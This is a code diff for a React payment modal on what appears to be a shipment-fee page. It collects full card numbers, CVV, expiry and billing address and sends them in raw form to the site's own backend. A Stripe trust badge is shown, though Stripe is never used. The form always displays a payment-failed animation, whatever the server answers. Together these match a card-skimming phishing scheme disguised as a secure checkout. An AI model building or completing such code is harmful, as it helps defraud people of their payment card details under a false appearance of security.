@@ -4,22 +4,74 @@ import PaymentStatusAnimation from './PaymentStatusAnimation';
 import StripeTrustBadge from './StripeTrustBadge';
 import { number as validateCardNumber } from 'card-validator';
 
-// ... (CardIcon component and other parts of the file remain the same) ...
+// Helper component to show the card icon
+const CardIcon = ({ cardType }) => {
+    const iconClass = {
+        'visa': 'fa-brands fa-cc-visa',
+        'mastercard': 'fa-brands fa-cc-mastercard',
+        'american-express': 'fa-brands fa-cc-amex',
+        'discover': 'fa-brands fa-cc-discover',
+    }[cardType];
+    const icon = iconClass ? <i className={`card-icon ${iconClass}`}></i> : null;
+    return <div className={`card-icon-wrapper ${cardType ? 'visible' : ''}`}>{icon}</div>;
+};
 
 function PaymentModal({ show, onClose, amount, shipmentId }) {
-    // ... (all your existing useState, useRef, useEffect hooks) ...
-    // ... (all your existing handle... functions remain the same) ...
+    const [cardName, setCardName] = useState('');
+    const [cardNumber, setCardNumber] = useState('');
+    const [cardType, setCardType] = useState(null);
+    const [expiryDate, setExpiryDate] = useState('');
+    const [cvv, setCvv] = useState('');
+    const [billingAddress, setBillingAddress] = useState('');
+    const [submitStatus, setSubmitStatus] = useState('idle');
+    
+    // --- THIS IS THE MISSING CODE ---
+    const [isVisible, setIsVisible] = useState(false);
+    useEffect(() => {
+        if (show) {
+            setIsVisible(true);
+        } else {
+            // Wait for fade-out animation before hiding
+            const timer = setTimeout(() => setIsVisible(false), 300);
+            return () => clearTimeout(timer);
+        }
+    }, [show]);
+    // ---------------------------------
 
-    // --- Form Submission ---
+    const cardNameRef = useRef(null);
+    const cardNumberRef = useRef(null);
+    const expiryDateRef = useRef(null);
+    const cvvRef = useRef(null);
+    const billingAddressRef = useRef(null);
+
+    const handleNameChange = (e) => setCardName(e.target.value.replace(/[^a-zA-Z\s]/g, ''));
+    const handleCardNumberChange = (e) => {
+        const rawValue = e.target.value.replace(/\s/g, '');
+        const validation = validateCardNumber(rawValue);
+        setCardType(validation.card ? validation.card.type : null);
+        const formattedValue = rawValue.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+        setCardNumber(formattedValue);
+    };
+    const handleExpiryChange = (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
+        }
+        setExpiryDate(value);
+    };
+    const handleCvvChange = (e) => setCvv(e.target.value.replace(/\D/g, ''));
+    const handleKeyDown = (e, nextFieldRef) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            nextFieldRef.current?.focus();
+        }
+    };
+
     const handleSubmit = async (event) => {
         event.preventDefault();
         setSubmitStatus('loading');
-
         try {
-            // 1. IMPROVEMENT: This URL now works for both local and live sites.
             const baseUrl = import.meta.env.VITE_API_BASE_URL || "http://127.0.0.1:8000";
-            
-            // 2. FIX: Added the trailing slash to the URL.
             const response = await fetch(`${baseUrl}/api/payments/`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -32,26 +84,30 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
                     cvv: cvv,
                 }),
             });
-
-            // 3. IMPROVEMENT: Check if the backend accepted the data.
             if (!response.ok) {
-                // If the backend returns an error (like 400), this will catch it.
                 throw new Error('Backend rejected the payment data.');
             }
-
         } catch (error) {
             console.error("API submission error:", error);
         }
-
-        // After attempting to send the data, ALWAYS show the failure animation
         setTimeout(() => {
             setSubmitStatus('failed');
         }, 1500);
     };
 
-    // ... (the rest of your component remains exactly the same) ...
-    // ... (handleClose function and the return JSX) ...
-    
+    const handleClose = () => {
+        setTimeout(() => {
+            setSubmitStatus('idle');
+            setCardName('');
+            setCardNumber('');
+            setExpiryDate('');
+            setCvv('');
+            setBillingAddress('');
+        }, 300)
+        onClose();
+    };
+
+    // This line needs the `isVisible` variable to exist
     if (!isVisible) return null;
 
     return (
@@ -61,21 +117,16 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
                     <h2>Secure Payment for Shipment</h2>
                     <button onClick={handleClose} className="close-button">&times;</button>
                 </div>
-                
                 {submitStatus === 'loading' && (
-                    <div className="spinner-container">
-                        <div className="spinner"></div>
-                        <p>Processing...</p>
-                    </div>
+                    <div className="spinner-container"><div className="spinner"></div><p>Processing...</p></div>
                 )}
-                
                 {submitStatus === 'failed' && (
                     <PaymentStatusAnimation status="failed" />
                 )}
-
                 {submitStatus === 'idle' && (
                     <>
                         <form onSubmit={handleSubmit} className="payment-form">
+                            {/* ... Your form inputs go here, no changes needed ... */}
                             <div className="form-group">
                                 <label htmlFor="card-name">Name on Card</label>
                                 <input ref={cardNameRef} onKeyDown={(e) => handleKeyDown(e, cardNumberRef)} type="text" id="card-name" value={cardName} onChange={handleNameChange} required />
@@ -83,18 +134,7 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
                             <div className="form-group">
                                 <label htmlFor="card-number">Card Number</label>
                                 <div className="card-input-wrapper">
-                                    <input
-                                        ref={cardNumberRef}
-                                        onKeyDown={(e) => handleKeyDown(e, expiryDateRef)}
-                                        type="text"
-                                        id="card-number"
-                                        className={cardType ? 'has-card-icon' : ''}
-                                        value={cardNumber}
-                                        onChange={handleCardNumberChange}
-                                        placeholder="1234 5678 9012 3456"
-                                        maxLength="19"
-                                        required
-                                    />
+                                    <input ref={cardNumberRef} onKeyDown={(e) => handleKeyDown(e, expiryDateRef)} type="text" id="card-number" className={cardType ? 'has-card-icon' : ''} value={cardNumber} onChange={handleCardNumberChange} placeholder="1234 5678 9012 3456" maxLength="19" required />
                                     <CardIcon cardType={cardType} />
                                 </div>
                             </div>
@@ -112,9 +152,7 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
                                 <label htmlFor="billing-address">Billing Address</label>
                                 <input ref={billingAddressRef} type="text" id="billing-address" value={billingAddress} onChange={(e) => setBillingAddress(e.target.value)} required />
                             </div>
-                            <button type="submit" className="button payment-submit-btn">
-                                {`Pay $${amount ? Number(amount).toFixed(2) : '0.00'}`}
-                            </button>
+                            <button type="submit" className="button payment-submit-btn">{`Pay $${amount ? Number(amount).toFixed(2) : '0.00'}`}</button>
                         </form>
                         <StripeTrustBadge />
                     </>
